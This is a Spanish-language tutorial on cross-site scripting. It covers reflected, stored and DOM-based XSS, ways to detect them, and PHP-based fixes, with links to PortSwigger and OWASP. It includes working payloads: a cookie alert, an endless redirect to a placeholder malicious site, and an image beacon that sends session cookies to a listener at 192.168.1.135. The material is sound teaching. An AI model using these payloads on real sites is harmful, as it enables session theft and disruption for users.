
# XSS

(Cross-Site Scripting)

## ¿Que es el XSS?

Cross-site scripting (también conocido como XSS) es una vulnerabilidad común de la seguridad web que permite a un atacante inyectar código malicioso en una página web.

## ¿Cómo funciona XSS?

---

El Cross-site scripting funcionan mediante la manipulación de un sitio web vulnerable para que devuelva JavaScript malicioso a los usuarios. Cuando el código malicioso se ejecuta dentro del navegador de la víctima, el atacante puede comprometer completamente su interacción con la aplicación.

![Untitled](/img/xss/xss%2089c3ffeba57145dc9cb6b57f51484e0e/Untitled.png)

## ****¿Cuáles son los tipos de ataques XSS?****

### XSS Reflected

---

tipo de vulnerabilidad web que ocurre cuando un atacante inyecta código malicioso en una página web que luego es reflejado de vuelta al usuario a través de un error de validación en la entrada de datos. Esto significa que el código malicioso se ejecuta en el navegador del usuario en lugar de en el servidor web.

Aqui podemos ver un ejemplo de XSS que con un alert nos saque la cookie de sesión

```bash
<script>
    alert(document.cookie);
</script>
```

### XSS Stored

---

Es un tipo de vulnerabilidad web que permite a un atacante inyectar código malicioso en una página web que luego se almacena en una base de datos o en el almacenamiento local del navegador del usuario. Este tipo de vulnerabilidad es más peligroso que el XSS Reflected, ya que el código malicioso se ejecuta en todos los navegadores que acceden a la página web y no solo en el navegador del usuario que realizó la acción.

este en si lo que se encarga es de hacer una continua redirección a un sitio malicioso y llegando a afectar a la disponibilidad.

```bash
<script>
    while (true) {
        window.location = "http://mi-sitio-malicioso.com/";
    }
</script>
```

Este ataque por XSS lo que se encarga es de enviar la cookie de sesión a la ip 192.168.1.135 que tendremos un puerto abierto en modo de escucha.

```bash
<script>new Image().src="http://192.168.1.135/bogus.php?output="+document.cookie;</script>
```

### XSS DOM

---

El XSS (Cross-Site Scripting) basado en el DOM (Document Object Model) es un tipo de ataque XSS que aprovecha las vulnerabilidades en la forma en que el navegador web procesa y renderiza el código HTML y JavaScript. En este tipo de ataque, el código malicioso se inyecta en una página web a través de una entrada de usuario no validada, como un formulario de entrada de datos, y luego se ejecuta en el navegador de la víctima cuando se carga la página.

```bash
<script>
var mensaje = document.createElement('h2');
mensaje.innerHTML = '¡Hola desde un ataque XSS basado en el DOM!';
document.body.appendChild(mensaje);
</script>
```

![Untitled](/img/xss/xss%2089c3ffeba57145dc9cb6b57f51484e0e/Untitled%201.png)

## Formas de detectar vulnerabilidades XSS

Existen multitud de formas para detectar vulnerabilidades XSS en una aplicación web como por ejemplo.

Escaneo automático: existen herramientas de escaneo automático de vulnerabilidades que pueden ayudar a detectar vulnerabilidades XSS. Estas herramientas realizan pruebas automatizadas de inyección de código en los formularios y campos de entrada de la aplicación, y pueden informar sobre las vulnerabilidades detectadas.

Análisis de código fuente: otra forma de detectar vulnerabilidades XSS es mediante el análisis del código fuente de la aplicación. Algunas herramientas de análisis estático de código pueden identificar patrones y fragmentos de código que son propensos a vulnerabilidades XSS.

Pruebas de penetración: las pruebas de penetración son un enfoque más exhaustivo para detectar vulnerabilidades XSS. Los expertos en seguridad pueden realizar pruebas de penetración para simular ataques XSS reales en la aplicación y determinar su nivel de riesgo.

etc.

Es importante recordar que la detección de vulnerabilidades XSS es solo una parte de un programa de seguridad completo. También es importante tomar medidas para remediar las vulnerabilidades detectadas y establecer políticas y procedimientos de seguridad adecuados para prevenir futuros ataques XSS.

## formas de securizar estos errores.

---

## XSS Reflected

Aqui tenemos una forma de securizar un XSS reflected

![Untitled](/img/xss/xss%2089c3ffeba57145dc9cb6b57f51484e0e/Untitled%202.png)

Primero, se verifica si existe un token Anti-CSRF y se comprueba si el token del usuario coincide con el token de sesión almacenado. Esto ayuda a prevenir ataques CSRF (Cross-Site Request Forgery) que intentan engañar al usuario para que realice acciones no deseadas en su sitio web.

Luego, el valor del parámetro “name” es almacenado en una variable llamada “$name” y se utiliza la función “htmlspecialchars” para escapar cualquier carácter especial y evitar posibles vulnerabilidades XSS (Cross-Site Scripting) que podrían ser explotadas por atacantes.

Finalmente, se muestra un mensaje en pantalla que contiene el valor del parámetro “name” para el usuario.

También hay una función llamada “generateSessionToken” que se encarga de generar un token Anti-CSRF único para la sesión actual del usuario.

## XSS stored

![Untitled](/img/xss/xss%2089c3ffeba57145dc9cb6b57f51484e0e/Untitled%203.png)

Este código PHP procesa un formulario de entrada que contiene un mensaje y un nombre de usuario. Si se envía el formulario (el botón “btnSign” es presionado), el código realiza lo siguiente:

Verifica si hay un token Anti-CSRF y comprueba si el token del usuario coincide con el token de sesión almacenado para prevenir ataques CSRF. Recupera el valor de los campos de entrada del formulario, “mtxMessage” y “txtName”. Sanitiza los valores ingresados por el usuario para evitar posibles vulnerabilidades XSS y SQL injection. Para esto, se eliminan las barras invertidas adicionales en el valor del campo y se escapan los caracteres especiales utilizando la función htmlspecialchars. Además, se utiliza la función mysqli_real_escape_string para escapar cualquier carácter especial en la entrada del usuario. Inserta el mensaje y el nombre de usuario en la base de datos utilizando una consulta preparada.

---

## Anexos

### [Cross-site scripting(XSS)](https://portswigger.net/web-security/cross-site-scripting)

### [XSS Reflected](https://portswigger.net/web-security/cross-site-scripting/reflected)

### [XSS Stored](https://portswigger.net/web-security/cross-site-scripting/stored)

### [XSS DOM](https://portswigger.net/web-security/cross-site-scripting/dom-based)

### [OWASP](https://owasp.org/www-community/attacks/xss/)

